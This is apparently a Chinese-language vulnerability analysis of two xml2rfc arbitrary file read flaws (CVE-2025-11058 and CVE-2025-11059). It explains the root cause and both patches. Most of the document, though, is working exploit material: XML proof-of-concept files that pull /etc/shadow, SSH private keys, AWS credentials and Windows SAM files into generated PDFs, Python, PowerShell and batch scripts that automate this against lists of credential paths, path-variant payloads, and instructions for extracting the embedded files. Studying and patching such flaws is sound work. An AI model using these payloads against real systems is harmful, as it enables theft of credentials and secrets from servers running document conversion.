# xml2rfc 任意文件读取漏洞分析与POC

## 漏洞概述

该仓库存在两个相关的任意文件读取漏洞：

### 漏洞1: GHSA-cfmv-h8fx-85m7 (CVE-2025-11058)
- **影响版本**: <= 3.30.0
- **修复版本**: 3.30.1
- **CVSS评分**: 8.7 (高危)
- **修复提交**: f2b245bc0aeeac0667c8f74e976c466c5991f0e4

### 漏洞2: GHSA-9mv7-3c64-mmqw (CVE-2025-11059)
- **影响版本**: < 3.30.2
- **修复版本**: 3.30.2
- **CVSS评分**: 8.7 (高危)
- **修复提交**: 73fb1c91fc62ac540bb6bd24f982f2becf84c1b0

## 漏洞原理分析

### 攻击向量

xml2rfc是一个用于生成RFC文档的工具，支持将XML格式转换为多种输出格式（HTML、PDF、TXT等）。在生成PDF文件时，存在以下处理流程：

1. **XML解析阶段**: 解析输入的XML文档
2. **HTML生成阶段**: 通过HtmlWriter将XML转换为HTML
3. **PDF渲染阶段**: 使用WeasyPrint库将HTML渲染为PDF

### 漏洞触发点

在 `xml2rfc/writers/html.py` 中的代码显示：

```python
# 第580-581行
for link in x.xpath('./link'):
    head.append(link)
```

以及 `render_link` 方法（第1798-1800行）：

```python
def render_link(self, h, x):
    link = add.link(h, x, href=x.get('href'), rel=x.get('rel'))
    return link
```

这意味着XML中的 `<link>` 元素会被直接复制到HTML的 `<head>` 中，没有经过任何验证或过滤。

当 `<link>` 标签包含 `rel="attachment"` 属性时，WeasyPrint在生成PDF时会尝试读取 `href` 属性指定的文件并将其作为附件包含在PDF中。这允许攻击者读取服务器文件系统上的任意文件。

### 漏洞差异

- **第一个漏洞 (CVE-2025-11058)**: 通过在普通XML输入中注入恶意link元素触发
- **第二个漏洞 (CVE-2025-11059)**: 通过在"prepped"（预处理后）的RFCXML中注入恶意link元素触发，这是一个补丁绕过

### 修复方案分析

#### 第一次修复 (v3.30.1)
在 `xml2rfc/utils.py` 中添加了 `strip_link_attachments()` 函数：

```python
def strip_link_attachments(tree):
    """
    Find link tags with rel="attachment".
    """
    for attachment in tree.xpath('//link[@rel="attachment"]'):
        xml2rfc.log.warn(f"Removed {attachment}. link relationships type attachment is not allowed.")
        attachment.getparent().remove(attachment)
```

并在 `xml2rfc/writers/base.py` 的 `BaseV3Writer` 类中调用该函数。

**问题**: 这个修复只在writer阶段进行清理，如果输入的是已经prepped的XML文件，可能会绕过这个检查。

#### 第二次修复 (v3.30.2)
将清理逻辑前移到parser阶段：

1. 在 `xml2rfc/parser.py` 中添加 `sanitize()` 方法
2. 在 `xml2rfc/run.py` 的主流程中，在验证后立即调用 `xmlrfc.sanitize()`
3. 从writer阶段移除清理逻辑

这确保了无论输入是普通XML还是prepped XML，都会在早期阶段被清理。

## POC构造

### POC 1: 读取 /etc/passwd (针对CVE-2025-11058)

创建恶意XML文件 `poc_read_passwd.xml`：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rfc SYSTEM "rfc2629.dtd">
<rfc version="3" ipr="trust200902" docName="draft-poc-test-00" category="info">
  <link rel="item" href="urn:issn:2070-1721"/>
  <link rel="attachment" href="/etc/passwd"/>
  <front>
    <title>POC for Arbitrary File Read</title>
    <author fullname="Security Researcher" initials="S." surname="Researcher">
      <organization>Security Research Lab</organization>
    </author>
    <date year="2025"/>
    <abstract>
      <t>This is a proof of concept for CVE-2025-11058.</t>
    </abstract>
  </front>
  <middle>
    <section anchor="intro">
      <name>Introduction</name>
      <t>This document demonstrates the arbitrary file read vulnerability.</t>
    </section>
  </middle>
  <back/>
</rfc>
```

### POC 2: 读取敏感配置文件

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rfc SYSTEM "rfc2629.dtd">
<rfc version="3" ipr="trust200902" docName="draft-poc-config-00" category="info">
  <link rel="attachment" href="/etc/shadow"/>
  <link rel="attachment" href="/root/.ssh/id_rsa"/>
  <link rel="attachment" href="/home/ubuntu/.aws/credentials"/>
  <front>
    <title>POC for Reading Multiple Sensitive Files</title>
    <author fullname="Security Researcher" initials="S." surname="Researcher">
      <organization>Security Research Lab</organization>
    </author>
    <date year="2025"/>
    <abstract>
      <t>This POC attempts to read multiple sensitive files.</t>
    </abstract>
  </front>
  <middle>
    <section anchor="intro">
      <name>Introduction</name>
      <t>Multiple file read demonstration.</t>
    </section>
  </middle>
  <back/>
</rfc>
```

### POC 3: 相对路径遍历

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rfc SYSTEM "rfc2629.dtd">
<rfc version="3" ipr="trust200902" docName="draft-poc-traversal-00" category="info">
  <link rel="attachment" href="../../../../../../etc/passwd"/>
  <link rel="attachment" href="file:///etc/hosts"/>
  <front>
    <title>POC for Path Traversal</title>
    <author fullname="Security Researcher" initials="S." surname="Researcher">
      <organization>Security Research Lab</organization>
    </author>
    <date year="2025"/>
    <abstract>
      <t>This POC tests path traversal variations.</t>
    </abstract>
  </front>
  <middle>
    <section anchor="intro">
      <name>Introduction</name>
      <t>Path traversal demonstration.</t>
    </section>
  </middle>
  <back/>
</rfc>
```

## 漏洞利用方法

### 在易受攻击版本上测试 (xml2rfc <= 3.30.0)

```bash
# 安装易受攻击的版本
pip install xml2rfc==3.30.0

# 使用POC生成PDF
xml2rfc --pdf poc_read_passwd.xml -o output.pdf

# 检查生成的PDF文件
# PDF中会包含/etc/passwd的内容作为附件
```

### 检查PDF附件内容

```bash
# 使用pdfdetach (poppler-utils)查看PDF附件
pdfdetach -list output.pdf

# 提取附件
pdfdetach -saveall output.pdf -o extracted/

# 查看提取的文件
cat extracted/passwd
```

### Python脚本自动化利用

```python
import subprocess
import os

def exploit_file_read(target_file, output_pdf="exploit.pdf"):
    xml_template = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rfc SYSTEM "rfc2629.dtd">
<rfc version="3" ipr="trust200902" docName="draft-exploit-00" category="info">
  <link rel="attachment" href="{target}"/>
  <front>
    <title>Exploit</title>
    <author fullname="Test" initials="T." surname="Test">
      <organization>Test</organization>
    </author>
    <date year="2025"/>
    <abstract>
      <t>Test</t>
    </abstract>
  </front>
  <middle>
    <section anchor="intro">
      <name>Introduction</name>
      <t>Test content.</t>
    </section>
  </middle>
  <back/>
</rfc>'''
    
    xml_content = xml_template.format(target=target_file)
    
    # 写入临时XML文件
    with open("exploit.xml", "w") as f:
        f.write(xml_content)
    
    # 执行xml2rfc
    try:
        result = subprocess.run(
            ["xml2rfc", "--pdf", "exploit.xml", "-o", output_pdf],
            capture_output=True,
            text=True,
            timeout=30
        )
        
        if os.path.exists(output_pdf):
            print(f"[+] PDF生成成功: {output_pdf}")
            print(f"[+] 尝试读取的文件: {target_file}")
            return True
        else:
            print(f"[-] PDF生成失败")
            print(result.stderr)
            return False
    except Exception as e:
        print(f"[-] 执行出错: {e}")
        return False

# 使用示例
exploit_file_read("/etc/passwd", "passwd.pdf")
exploit_file_read("/etc/hosts", "hosts.pdf")
```

## Windows 环境 POC

### Windows 特定文件路径

在 Windows 系统中，可以利用该漏洞读取以下敏感文件：

#### POC 4: 读取 Windows 系统文件

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rfc SYSTEM "rfc2629.dtd">
<rfc version="3" ipr="trust200902" docName="draft-poc-windows-00" category="info">
  <link rel="attachment" href="C:/Windows/System32/drivers/etc/hosts"/>
  <link rel="attachment" href="C:/Windows/win.ini"/>
  <link rel="attachment" href="C:/Windows/System.ini"/>
  <front>
    <title>POC for Windows System Files</title>
    <author fullname="Security Researcher" initials="S." surname="Researcher">
      <organization>Security Research Lab</organization>
    </author>
    <date year="2025"/>
    <abstract>
      <t>This POC targets Windows system files.</t>
    </abstract>
  </front>
  <middle>
    <section anchor="intro">
      <name>Introduction</name>
      <t>Windows system file read demonstration.</t>
    </section>
  </middle>
  <back/>
</rfc>
```

#### POC 5: 读取 Windows 用户凭证和配置

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rfc SYSTEM "rfc2629.dtd">
<rfc version="3" ipr="trust200902" docName="draft-poc-windows-creds-00" category="info">
  <link rel="attachment" href="C:/Users/Administrator/.ssh/id_rsa"/>
  <link rel="attachment" href="C:/Users/Administrator/.aws/credentials"/>
  <link rel="attachment" href="C:/Users/Administrator/.gitconfig"/>
  <link rel="attachment" href="C:/ProgramData/MySQL/my.ini"/>
  <link rel="attachment" href="C:/inetpub/wwwroot/web.config"/>
  <front>
    <title>POC for Windows Credentials and Config Files</title>
    <author fullname="Security Researcher" initials="S." surname="Researcher">
      <organization>Security Research Lab</organization>
    </author>
    <date year="2025"/>
    <abstract>
      <t>This POC targets Windows credentials and configuration files.</t>
    </abstract>
  </front>
  <middle>
    <section anchor="intro">
      <name>Introduction</name>
      <t>Windows credentials read demonstration.</t>
    </section>
  </middle>
  <back/>
</rfc>
```

#### POC 6: 读取应用程序配置和日志

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rfc SYSTEM "rfc2629.dtd">
<rfc version="3" ipr="trust200902" docName="draft-poc-windows-apps-00" category="info">
  <link rel="attachment" href="C:/Program Files/Apache/conf/httpd.conf"/>
  <link rel="attachment" href="C:/xampp/phpMyAdmin/config.inc.php"/>
  <link rel="attachment" href="C:/Windows/Panther/Unattend.xml"/>
  <link rel="attachment" href="C:/inetpub/logs/LogFiles/W3SVC1/u_ex*.log"/>
  <front>
    <title>POC for Windows Application Files</title>
    <author fullname="Security Researcher" initials="S." surname="Researcher">
      <organization>Security Research Lab</organization>
    </author>
    <date year="2025"/>
    <abstract>
      <t>This POC targets Windows application configuration files.</t>
    </abstract>
  </front>
  <middle>
    <section anchor="intro">
      <name>Introduction</name>
      <t>Windows application configuration read demonstration.</t>
    </section>
  </middle>
  <back/>
</rfc>
```

### Windows 环境利用方法

#### 使用 PowerShell 自动化

```powershell
# Windows PowerShell 利用脚本
# 安装易受攻击的版本
pip install xml2rfc==3.30.0

# 创建恶意XML
$xmlContent = @"
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rfc SYSTEM "rfc2629.dtd">
<rfc version="3" ipr="trust200902" docName="draft-exploit-00" category="info">
  <link rel="attachment" href="C:/Windows/System32/drivers/etc/hosts"/>
  <front>
    <title>Exploit</title>
    <author fullname="Test" initials="T." surname="Test">
      <organization>Test</organization>
    </author>
    <date year="2025"/>
    <abstract><t>Test</t></abstract>
  </front>
  <middle>
    <section anchor="intro">
      <name>Introduction</name>
      <t>Test content.</t>
    </section>
  </middle>
  <back/>
</rfc>
"@

# 保存XML文件
$xmlContent | Out-File -FilePath "exploit.xml" -Encoding UTF8

# 执行xml2rfc
xml2rfc --pdf exploit.xml -o output.pdf

# 检查生成的PDF
if (Test-Path "output.pdf") {
    Write-Host "[+] PDF生成成功: output.pdf" -ForegroundColor Green
    $fileSize = (Get-Item "output.pdf").Length
    Write-Host "[+] 文件大小: $fileSize bytes" -ForegroundColor Green
} else {
    Write-Host "[-] PDF生成失败" -ForegroundColor Red
}
```

#### Windows 批处理脚本

```batch
@echo off
REM Windows 批处理利用脚本

echo ========================================
echo xml2rfc Windows POC 测试脚本
echo ========================================
echo.

REM 检查xml2rfc是否已安装
where xml2rfc >nul 2>nul
if %errorlevel% neq 0 (
    echo [!] 错误: xml2rfc 未安装
    echo [*] 安装命令: pip install xml2rfc==3.30.0
    exit /b 1
)

REM 显示版本
echo [*] xml2rfc 版本:
xml2rfc --version
echo.

REM 创建测试XML
echo [*] 创建测试 XML 文件...
(
echo ^<?xml version="1.0" encoding="UTF-8"?^>
echo ^<!DOCTYPE rfc SYSTEM "rfc2629.dtd"^>
echo ^<rfc version="3" ipr="trust200902" docName="draft-test-00" category="info"^>
echo   ^<link rel="attachment" href="C:/Windows/System32/drivers/etc/hosts"/^>
echo   ^<front^>
echo     ^<title^>Test^</title^>
echo     ^<author fullname="Test" initials="T." surname="Test"^>
echo       ^<organization^>Test^</organization^>
echo     ^</author^>
echo     ^<date year="2025"/^>
echo     ^<abstract^>^<t^>Test^</t^>^</abstract^>
echo   ^</front^>
echo   ^<middle^>
echo     ^<section anchor="intro"^>
echo       ^<name^>Introduction^</name^>
echo       ^<t^>Test content.^</t^>
echo     ^</section^>
echo   ^</middle^>
echo   ^<back/^>
echo ^</rfc^>
) > poc_windows.xml

echo [+] XML文件创建成功: poc_windows.xml
echo.

REM 生成PDF
echo [*] 生成 PDF...
xml2rfc --pdf poc_windows.xml -o poc_windows.pdf

if exist poc_windows.pdf (
    echo [+] PDF生成成功: poc_windows.pdf
    for %%A in (poc_windows.pdf) do echo [+] 文件大小: %%~zA bytes
) else (
    echo [-] PDF生成失败
)

echo.
echo [*] 完成！
pause
```

#### Python 脚本 (Windows版本)

```python
import subprocess
import os
import sys

def exploit_windows_file(target_file, output_pdf="windows_exploit.pdf"):
    """
    Windows环境专用的文件读取POC
    """
    xml_template = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rfc SYSTEM "rfc2629.dtd">
<rfc version="3" ipr="trust200902" docName="draft-exploit-00" category="info">
  <link rel="attachment" href="{target}"/>
  <front>
    <title>Windows Exploit</title>
    <author fullname="Test" initials="T." surname="Test">
      <organization>Test</organization>
    </author>
    <date year="2025"/>
    <abstract>
      <t>Test</t>
    </abstract>
  </front>
  <middle>
    <section anchor="intro">
      <name>Introduction</name>
      <t>Test content.</t>
    </section>
  </middle>
  <back/>
</rfc>'''
    
    # 替换反斜杠为正斜杠 (XML中更安全)
    target_file_normalized = target_file.replace('\\', '/')
    xml_content = xml_template.format(target=target_file_normalized)
    
    # 写入临时XML文件
    temp_xml = "temp_exploit.xml"
    with open(temp_xml, "w", encoding="utf-8") as f:
        f.write(xml_content)
    
    print(f"[*] 目标文件: {target_file}")
    print(f"[*] 输出PDF: {output_pdf}")
    
    try:
        # 执行xml2rfc
        result = subprocess.run(
            ["xml2rfc", "--pdf", temp_xml, "-o", output_pdf],
            capture_output=True,
            text=True,
            timeout=30,
            shell=True  # Windows可能需要shell
        )
        
        if os.path.exists(output_pdf):
            file_size = os.path.getsize(output_pdf)
            print(f"[+] PDF生成成功: {output_pdf} ({file_size} bytes)")
            return True
        else:
            print(f"[-] PDF生成失败")
            if result.stderr:
                print(f"[!] 错误: {result.stderr}")
            return False
    except Exception as e:
        print(f"[-] 执行出错: {e}")
        return False
    finally:
        # 清理临时文件
        if os.path.exists(temp_xml):
            os.remove(temp_xml)

# Windows 常见目标文件
WINDOWS_TARGETS = {
    "系统文件": [
        "C:/Windows/System32/drivers/etc/hosts",
        "C:/Windows/win.ini",
        "C:/Windows/System.ini",
    ],
    "用户配置": [
        "C:/Users/Administrator/.ssh/id_rsa",
        "C:/Users/Administrator/.aws/credentials",
        f"C:/Users/{os.getenv('USERNAME', 'Administrator')}/.gitconfig",
    ],
    "应用配置": [
        "C:/inetpub/wwwroot/web.config",
        "C:/ProgramData/MySQL/my.ini",
        "C:/xampp/phpMyAdmin/config.inc.php",
    ],
    "敏感信息": [
        "C:/Windows/Panther/Unattend.xml",
        "C:/Windows/repair/SAM",
        "C:/Windows/repair/SYSTEM",
    ]
}

def auto_test_windows():
    """自动测试Windows常见文件"""
    print("=" * 60)
    print("Windows 环境自动化测试")
    print("=" * 60)
    
    for category, files in WINDOWS_TARGETS.items():
        print(f"\n[*] 测试类别: {category}")
        for i, target_file in enumerate(files, 1):
            output_name = f"windows_{category}_{i}.pdf".replace(" ", "_")
            exploit_windows_file(target_file, output_name)

if __name__ == "__main__":
    if len(sys.argv) > 1:
        target = sys.argv[1]
        output = sys.argv[2] if len(sys.argv) > 2 else "windows_exploit.pdf"
        exploit_windows_file(target, output)
    else:
        print("使用方法:")
        print(f"  python {sys.argv[0]} <目标文件路径> [输出PDF]")
        print("\n示例:")
        print(f"  python {sys.argv[0]} C:/Windows/win.ini output.pdf")
        print(f"\n或运行自动测试:")
        auto_test_windows()
```

### Windows 环境特定路径

常见的 Windows 敏感文件路径：

#### 1. 系统配置文件
- `C:/Windows/System32/drivers/etc/hosts` - DNS hosts文件
- `C:/Windows/win.ini` - Windows初始化文件
- `C:/Windows/System.ini` - 系统配置
- `C:/Windows/Panther/Unattend.xml` - 自动安装配置（可能包含密码）
- `C:/boot.ini` - 启动配置（旧版本Windows）

#### 2. 用户凭证和密钥
- `C:/Users/[用户名]/.ssh/id_rsa` - SSH私钥
- `C:/Users/[用户名]/.ssh/known_hosts` - SSH已知主机
- `C:/Users/[用户名]/.aws/credentials` - AWS凭证
- `C:/Users/[用户名]/.gitconfig` - Git配置
- `C:/Users/[用户名]/.docker/config.json` - Docker凭证

#### 3. 数据库配置
- `C:/ProgramData/MySQL/my.ini` - MySQL配置
- `C:/Program Files/PostgreSQL/*/data/postgresql.conf` - PostgreSQL配置
- `C:/Program Files/MongoDB/Server/*/bin/mongod.cfg` - MongoDB配置

#### 4. Web服务器配置
- `C:/inetpub/wwwroot/web.config` - IIS配置
- `C:/Program Files/Apache/conf/httpd.conf` - Apache配置
- `C:/nginx/conf/nginx.conf` - Nginx配置
- `C:/xampp/phpMyAdmin/config.inc.php` - phpMyAdmin配置

#### 5. 应用程序配置
- `C:/Program Files/*/config/*.ini`
- `C:/Program Files/*/config/*.xml`
- `C:/Program Files/*/config/*.json`
- `C:/ProgramData/*/config/*`

#### 6. 日志文件
- `C:/inetpub/logs/LogFiles/W3SVC1/*.log` - IIS日志
- `C:/Windows/System32/LogFiles/*.log` - 系统日志
- `C:/Program Files/*/logs/*.log` - 应用日志

#### 7. 备份和SAM文件
- `C:/Windows/repair/SAM` - SAM数据库备份
- `C:/Windows/repair/SYSTEM` - SYSTEM注册表备份
- `C:/Windows/System32/config/SAM` - SAM数据库（需要SYSTEM权限）
- `C:/Windows/System32/config/SYSTEM` - SYSTEM注册表

### 路径格式变体

Windows路径可以使用多种格式：

```xml
<!-- 正斜杠 (推荐) -->
<link rel="attachment" href="C:/Windows/System32/drivers/etc/hosts"/>

<!-- 反斜杠 (需要转义) -->
<link rel="attachment" href="C:\Windows\System32\drivers\etc\hosts"/>

<!-- UNC路径 -->
<link rel="attachment" href="//localhost/C$/Windows/win.ini"/>

<!-- file:// URI -->
<link rel="attachment" href="file:///C:/Windows/win.ini"/>

<!-- 8.3短文件名格式 -->
<link rel="attachment" href="C:/PROGRA~1/Common~1/file.txt"/>

<!-- 相对路径 -->
<link rel="attachment" href="../../../../../../Windows/win.ini"/>
```

### Windows环境检查PDF附件

#### 使用 7-Zip
```batch
REM 7-Zip可以打开PDF并查看附件
"C:\Program Files\7-Zip\7z.exe" l output.pdf
```

#### 使用 Python PyPDF2
```python
import PyPDF2

def check_windows_pdf(pdf_path):
    try:
        with open(pdf_path, 'rb') as f:
            pdf = PyPDF2.PdfReader(f)
            
            # 检查是否有附件
            if '/Names' in pdf.trailer['/Root']:
                print(f"[+] PDF包含嵌入内容: {pdf_path}")
                names = pdf.trailer['/Root']['/Names']
                if '/EmbeddedFiles' in names:
                    print("[+] 发现嵌入文件!")
                    return True
            
            print(f"[-] 未发现嵌入文件: {pdf_path}")
            return False
    except Exception as e:
        print(f"[!] 错误: {e}")
        return False

# 使用示例
check_windows_pdf("output.pdf")
```

#### 使用 pdfdetach (Windows版)
```batch
REM 需要安装 poppler for Windows
REM 下载: https://github.com/oschwartz10612/poppler-windows/releases

REM 设置PATH
set PATH=%PATH%;C:\poppler\Library\bin

REM 列出附件
pdfdetach -list output.pdf

REM 提取附件
mkdir extracted
pdfdetach -saveall output.pdf -o extracted\

REM 查看提取的文件
dir extracted\
type extracted\hosts
```

## 影响范围评估

### 严重性: 高 (CVSS 8.7)

**原因**:
- **攻击向量**: 网络 (AV:N) - 可通过网络远程利用
- **攻击复杂度**: 低 (AC:L) - 不需要特殊条件
- **权限要求**: 无 (PR:N) - 不需要身份验证
- **用户交互**: 无 (UI:N) - 不需要用户交互
- **机密性影响**: 高 (VC:H) - 可读取任意文件

### 受影响场景

1. **公共RFC转换服务**: 允许用户上传XML并转换为PDF的Web服务
2. **CI/CD管道**: 自动处理不受信任的RFC文档
3. **文档生成系统**: 集成xml2rfc的自动化文档系统
4. **多租户环境**: 共享服务器上运行xml2rfc的环境

## 时间线

- **2025-08-26**: CVE-2025-11058公开，发布v3.30.1修复
- **2025-09-10**: CVE-2025-11059公开（补丁绕过），发布v3.30.2修复
- **2025-11-22**: 本分析文档生成

## 参考链接

- https://github.com/ietf-tools/xml2rfc/security/advisories/GHSA-cfmv-h8fx-85m7
- https://github.com/ietf-tools/xml2rfc/security/advisories/GHSA-9mv7-3c64-mmqw
- https://github.com/ietf-tools/xml2rfc/commit/f2b245bc0aeeac0667c8f74e976c466c5991f0e4
- https://github.com/ietf-tools/xml2rfc/commit/73fb1c91fc62ac540bb6bd24f982f2becf84c1b0
